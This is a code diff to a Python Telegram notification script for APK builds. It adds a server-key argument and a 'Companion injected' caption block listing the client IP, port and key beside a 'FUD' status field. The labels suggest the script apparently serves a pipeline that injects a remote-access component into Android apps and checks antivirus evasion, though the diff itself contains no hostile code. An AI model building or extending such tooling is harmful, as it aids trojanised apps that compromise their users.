@@ -559,10 +559,11 @@ def main():
                         choices=["full", "companion_only"])
     parser.add_argument("--commit",      default="", dest="commit")
     parser.add_argument("--client-name", default="", dest="client_name")
-    parser.add_argument("--client-ip",   default="", dest="client_ip")
-    parser.add_argument("--client-port", default="", dest="client_port")
-    parser.add_argument("--app-name",    default="", dest="app_name")
-    parser.add_argument("--fud-status",  default="", dest="fud_status")
+    parser.add_argument("--client-ip",    default="", dest="client_ip")
+    parser.add_argument("--client-port",  default="", dest="client_port")
+    parser.add_argument("--server-key",   default="", dest="server_key")
+    parser.add_argument("--app-name",     default="", dest="app_name")
+    parser.add_argument("--fud-status",   default="", dest="fud_status")
     # ── sub-step mode: called from build_module.py for per-phase updates ──────
     # Usage:
     #   python3 telegram_notify.py \
@@ -712,14 +713,19 @@ def main():
                 _fud_lbl = "OFF 🔴"
             else:
                 _fud_lbl = "—"
+            _key_lbl = args.server_key or "—"
             caption = (
                 f"📦 <b>Build #{args.build} — {emoji} {display_name}</b>\n"
                 f"Client   : {args.client_name or args.client}\n"
                 f"App      : {_app_name}\n"
                 f"Template : {_template_lbl}\n"
                 f"FUD      : {_fud_lbl}\n"
+                f"━━━━━━━━━━━━━━━━━━━━\n"
+                f"🌐 Companion injected:\n"
                 f"IP       : <code>{args.client_ip or 'N/A'}</code>\n"
                 f"Port     : <code>{args.client_port or 'N/A'}</code>\n"
+                f"Key      : <code>{_key_lbl}</code>\n"
+                f"━━━━━━━━━━━━━━━━━━━━\n"
                 f"Package  : <code>{args.pkg}</code>\n"
                 f"Size     : {args.apk_size}"
             )
